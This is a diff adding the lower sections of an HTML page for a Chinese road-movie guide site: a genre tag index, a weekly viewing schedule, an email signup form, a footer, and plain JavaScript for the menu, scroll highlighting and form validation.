+      <div class="rk"><span class="no">10</span><div class="body"><div class="nm"><span>无人知晓</span><em>2004 · 漂泊邦</em></div><div class="tp"><i style="width:70%"></i></div></div><b>76</b></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑤ 类型索引 ==================== -->
+<section id="idx">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.5</span><h2>类型<em>索引</em> · 按"上路的原因"找片</h2><span class="en">INDEX</span><a class="more" href="#">按国家 / 按年代 →</a></div>
+    <div class="idxbox rev">
+      <div class="cloud">
+        <a href="#">逃婚上路 <b>6</b></a>
+        <a href="#">替别人上路 <b>9</b></a>
+        <a href="#">没有目的地的上路 <b>12</b></a>
+        <a href="#">为了一个答案上路 <b>7</b></a>
+        <a href="#">被命运逼上路 <b>8</b></a>
+        <a href="#">两个人，一条路 <b>11</b></a>
+        <a href="#">一个人，一台车 <b>14</b></a>
+        <a href="#">老路重走 <b>5</b></a>
+        <a href="#">边境与渡口 <b>6</b></a>
+        <a href="#">雨天公路 <b>4</b></a>
+        <a href="#">夜间驾驶 <b>7</b></a>
+        <a href="#">海边公路 <b>5</b></a>
+        <a href="#">雪路 <b>3</b></a>
+        <a href="#">山路与盘旋 <b>4</b></a>
+        <a href="#">加油站停一下 <b>6</b></a>
+        <a href="#">搭车的人 <b>8</b></a>
+      </div>
+      <aside class="side">
+        <h4>▲ 按片名首字母</h4>
+        <div class="alph">
+          <a href="#">A</a><a href="#">B</a><a href="#">C</a><a href="#">D</a><a href="#">E</a><a href="#">F</a>
+          <a href="#">G</a><a href="#">H</a><a href="#">J</a><a href="#">K</a><a href="#">L</a><a href="#">M</a>
+          <a href="#">N</a><a href="#">P</a><a href="#">Q</a><a href="#">R</a><a href="#">S</a><a href="#">T</a>
+          <a href="#">W</a><a href="#">X</a><a href="#">Y</a><a href="#">Z</a><a href="#">#</a><a href="#">?</a>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== ⑥ 追剧里程 ==================== -->
+<section id="odo">
+  <div class="container">
+    <div class="sec-h rev"><span class="tag">NO.6</span><h2>追剧<em>里程</em> · 一周七天，七种"上路"的看片法</h2><span class="en">MILEAGE</span><a class="more" href="#">导出到日历 →</a></div>
+    <div class="odo rev">
+      <div class="it"><div class="d">MON<small>周一</small></div><h4>读一篇导演访谈</h4><div class="bar"><i style="width:30%"></i></div><div class="mi">20′</div></div>
+      <div class="it"><div class="d">TUE<small>周二</small></div><h4>看一段"前挡风"长镜</h4><div class="bar"><i style="width:40%"></i></div><div class="mi">15′</div></div>
+      <div class="it"><div class="d">WED<small>周三</small></div><h4>看一部冷门公路片</h4><div class="bar"><i style="width:55%"></i></div><div class="mi">110′</div></div>
+      <div class="it on"><div class="d">THU<small>周四 · 更新日</small></div><h4>读三邦车视本期</h4><div class="bar"><i style="width:60%"></i></div><div class="mi">15′</div></div>
+      <div class="it"><div class="d">FRI<small>周五</small></div><h4>找一部"不是公路片的公路片"</h4><div class="bar"><i style="width:70%"></i></div><div class="mi">105′</div></div>
+      <div class="it"><div class="d">SAT<small>周六</small></div><h4>连看同一导演两部公路片</h4><div class="bar"><i style="width:88%"></i></div><div class="mi">220′</div></div>
+      <div class="it"><div class="d">SUN<small>周日</small></div><h4>关掉画面，只听引擎声</h4><div class="bar"><i style="width:34%"></i></div><div class="mi">12′</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 订阅 ==================== -->
+<section id="joinS">
+  <div class="container">
+    <div class="join rev">
+      <div>
+        <h3>订阅「<i>三邦车视 · 每周一路</i>」</h3>
+        <p>每周三 19:00，一条短推送：<strong>一部公路片</strong> + <strong>一个可复用的驾驶视角技法</strong> + <strong>一段值得重看的公路</strong>。帮你从"看过很多"走到"看懂一些"。不群发、不推销、不附盗链、可一键退订。</p>
+      </div>
+      <form id="sub" novalidate>
+        <input type="email" id="mail" placeholder="留下邮箱，周四上路" aria-label="邮箱" required>
+        <button type="submit">上路</button>
+      </form>
+    </div>
+  </div>
+</section>
+
+<!-- ==================== 页脚 ==================== -->
+<footer>
+  <div class="container">
+    <div class="fgrid">
+      <div class="ft">
+        <a class="logo" href="#"><span class="steer" aria-hidden="true"><i></i></span><b style="color:#fff">三邦车视电影网</b><em>ON THE ROAD</em></a>
+        <p>三邦车视电影网是一个原创的<strong>公路片观影方法与片单</strong>站点，专注三件事：公路片的三个国度（逃离 / 寻找 / 漂泊）、方向盘片单（小汽车 / 摩托车 / 自行车 / 房车 / 出租车 / 火车船）、驾驶视角技法（前挡风机位 / 地平线构图 / 引擎声代替配乐）。我们用 8 部公路片单 + 6 类方向盘片单 + 3 项驾驶技法 + 16 种上路原因索引 + 7 天追剧里程，把"看懂公路片"这件事讲清楚。本站<strong>只做收录与原创解读，不提供任何影视资源下载与盗链</strong>，倡导通过影院与正规视频平台观看。</p>
+      </div>
+      <div class="fcol"><h4>快速入口</h4><a href="#road">公路片单</a><a href="#wheel">方向盘片单</a><a href="#drive">驾驶视角</a><a href="#hot">口碑榜</a><a href="#idx">类型索引</a><a href="#odo">追剧里程</a></div>
+      <div class="fcol"><h4>技法手册</h4><a href="#">前挡风机位</a><a href="#">地平线构图</a><a href="#">引擎声设计</a><a href="#">公路片三幕</a><a href="#">色彩与季节</a><a href="#">长镜与跟拍</a></div>
+      <div class="fcol"><h4>关于</h4><a href="#">三邦是什么</a><a href="#">选片四条原则</a><a href="#">版权与正版声明</a><a href="#">投稿与合作</a><a href="#">观影礼仪</a></div>
+    </div>
+    <div class="copy">© 2026 三邦车视电影网 版权所有 · 网址：<a href="https://sanbangcheshidianyingwang-cn.github.io/">https://sanbangcheshidianyingwang-cn.github.io/</a> · 影视请通过影院与正规视频平台观看</div>
+  </div>
+</footer>
+
+<script>
+var bg=document.getElementById('burger'),ls=document.getElementById('links');
+bg.addEventListener('click',function(){ls.classList.toggle('open');bg.setAttribute('aria-expanded',ls.classList.contains('open'));});
+ls.addEventListener('click',function(e){if(e.target.tagName==='A'){ls.classList.remove('open');bg.setAttribute('aria-expanded','false');}});
+
+var secs=['top','road','wheel','drive','hot','idx','odo'].map(function(id){return document.getElementById(id);});
+var as=document.querySelectorAll('.links a');
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+150,cur='';
+  secs.forEach(function(s){if(s&&s.offsetTop<=y)cur=s.id;});
+  as.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+},{passive:true});
+
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e,i){if(e.isIntersecting){setTimeout(function(){e.target.classList.add('in');},i*55);io.unobserve(e.target);}});
+},{threshold:.1});
+document.querySelectorAll('.rev').forEach(function(el){io.observe(el);});
+
+document.getElementById('sub').addEventListener('submit',function(e){
+  e.preventDefault();
+  var v=document.getElementById('mail').value.trim();
+  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)){alert('邮箱格式不对，我们没法给你寄明信片 ◐');return;}
+  alert('订阅成功！本周四 19:00，第一部公路片，上路 ▲');
+  document.getElementById('mail').value='';
+});
+</script>
+</body>
+</html>
